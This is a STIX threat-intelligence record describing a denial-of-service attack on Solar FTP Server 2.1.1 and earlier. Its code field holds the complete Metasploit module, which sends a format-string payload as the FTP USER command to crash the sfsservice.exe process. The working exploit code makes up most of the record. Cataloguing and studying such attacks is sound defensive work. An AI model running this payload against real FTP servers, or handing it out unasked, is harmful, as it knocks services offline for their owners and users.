{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--58ee41b9-581a-4934-9005-75c30bc0e979",
    "created": "2024-08-14T16:25:17.385256Z",
    "modified": "2024-08-14T16:25:17.38526Z",
    "name": "Solar FTP Server Malformed USER Denial of Service",
    "description": " This module will send a format string as USER to Solar FTP, causing a READ violation in function \"__output_1()\" found in \"sfsservice.exe\" while trying to calculate the length of the string. This vulnerability affects versions 2.1.1 and earlier. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/ftp/solarftp_user.rb",
            "external_id": "solarftp_user.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Solar FTP Server Malformed USER Denial of Service',\n      'Description'    => %q{\n        This module will send a format string as USER to Solar FTP, causing a\n        READ violation in function \"__output_1()\" found in \"sfsservice.exe\"\n        while trying to calculate the length of the string. This vulnerability\n        affects versions 2.1.1 and earlier.\n      },\n      'Author'         =>\n      [\n        'x000 <3d3n[at]hotmail.com.br>',           # Initial disclosure/exploit\n        'C4SS!0 G0M3S <Louredo_[at]hotmail.com>',  # Metasploit submission\n        'sinn3r',                                  # Metasploit edit/commit\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n      [\n        [ 'EDB', '16204' ],\n      ],\n      'DisclosureDate' => '2011-02-22'))\n\n      register_options(\n      [\n        Opt::RPORT(21)\n      ])\n  end\n\n  def run\n    connect\n\n    banner = sock.get_once(-1, 10) || ''\n    print_status(\"Banner: #{banner.strip}\")\n\n    buf  = Rex::Text.pattern_create(50)\n    buf << \"%s%lf%n%c%l%c%n%n%n%nC%lf%u%lf%d%s%v%n\"\n    print_status(\"Sending format string...\")\n    sock.put(\"USER #{buf}\\r\\n\")\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-02-22"
}